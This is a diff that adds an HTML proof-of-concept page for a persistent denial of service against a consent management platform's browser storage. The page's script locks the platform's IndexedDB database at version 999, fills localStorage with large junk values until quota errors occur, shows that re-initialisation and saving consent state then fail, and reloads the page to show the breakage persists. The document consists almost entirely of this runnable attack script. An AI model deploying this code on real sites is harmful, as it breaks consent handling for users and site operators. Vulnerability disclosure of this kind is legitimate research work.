@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CMP Persistent Storage DoS – Vendor Impact PoC</title>
+</head>
+<body>
+<h3>CMP Tracker Configuration Failure PoC</h3>
+<p>Open DevTools → Console</p>
+
+<script>
+const DB_NAME = "uc-dev-tracker-store";
+const CMP_VERSION = 1;
+const LOCKED_VERSION = 999;
+
+/* =================================================
+   STEP 1 — Simulate CMP loading tracker configuration
+   ================================================= */
+async function loadTrackerConfig() {
+  console.log("[CMP] Loading tracker configuration...");
+
+  try {
+    const res = await fetch(
+      "https://storage.googleapis.com/uc-dev-tracker-declaration-config/",
+      { mode: "no-cors" }
+    );
+    console.log("[CMP] Tracker config request issued");
+  } catch (e) {
+    console.error("[CMP] Failed to load tracker configuration");
+    throw e;
+  }
+}
+
+/* =================================================
+   STEP 2 — CMP opens IndexedDB normally
+   ================================================= */
+function openCmpDb(version) {
+  return new Promise((resolve, reject) => {
+    const req = indexedDB.open(DB_NAME, version);
+
+    req.onupgradeneeded = e => {
+      const db = e.target.result;
+      if (!db.objectStoreNames.contains("declaration-config")) {
+        db.createObjectStore("declaration-config");
+      }
+    };
+
+    req.onsuccess = () => {
+      console.log(`[CMP] IndexedDB opened OK (version ${version})`);
+      resolve(req.result);
+    };
+
+    req.onerror = () => reject(req.error);
+  });
+}
+
+/* =================================================
+   STEP 3 — Attacker locks IndexedDB version
+   ================================================= */
+function lockDbVersion() {
+  return new Promise((resolve, reject) => {
+    const req = indexedDB.open(DB_NAME, LOCKED_VERSION);
+
+    req.onupgradeneeded = () => {
+      console.log(`[ATTACK] IndexedDB version locked at ${LOCKED_VERSION}`);
+    };
+
+    req.onsuccess = () => resolve();
+    req.onerror = () => reject(req.error);
+  });
+}
+
+/* =================================================
+   STEP 4 — Exhaust LocalStorage
+   ================================================= */
+function exhaustStorage() {
+  try {
+    let i = 0;
+    while (true) {
+      localStorage.setItem(
+        `uc-consent-payload-${i++}`,
+        "X".repeat(512 * 1024)
+      );
+    }
+  } catch (e) {
+    console.error("[STORAGE ERROR]", e.name);
+  }
+}
+
+/* =================================================
+   STEP 5 — CMP re-initialization failure
+   ================================================= */
+async function cmpReInit() {
+  console.log("[CMP] Re-initializing CMP...");
+
+  try {
+    await openCmpDb(CMP_VERSION);
+  } catch (e) {
+    console.error("[CRITICAL] Failed to open CMP IndexedDB:", e.name);
+  }
+
+  try {
+    localStorage.setItem("cmp-consent-state", "accepted");
+  } catch (e) {
+    console.error("[CRITICAL] Consent state unavailable:", e.name);
+  }
+}
+
+/* =================================================
+   STEP 6 — Persistence proof
+   ================================================= */
+function persistenceProof() {
+  console.log("--- RELOAD PAGE ---");
+  setTimeout(() => location.reload(), 2500);
+}
+
+/* =================================================
+   RUN PoC
+   ================================================= */
+(async function runPoC() {
+  console.log("==============================");
+  console.log(" START CMP SOFTWARE IMPACT PoC");
+  console.log("==============================");
+
+  await loadTrackerConfig();
+  await openCmpDb(CMP_VERSION);
+  await lockDbVersion();
+  exhaustStorage();
+  await cmpReInit();
+  persistenceProof();
+})();
+</script>
+</body>
+</html>
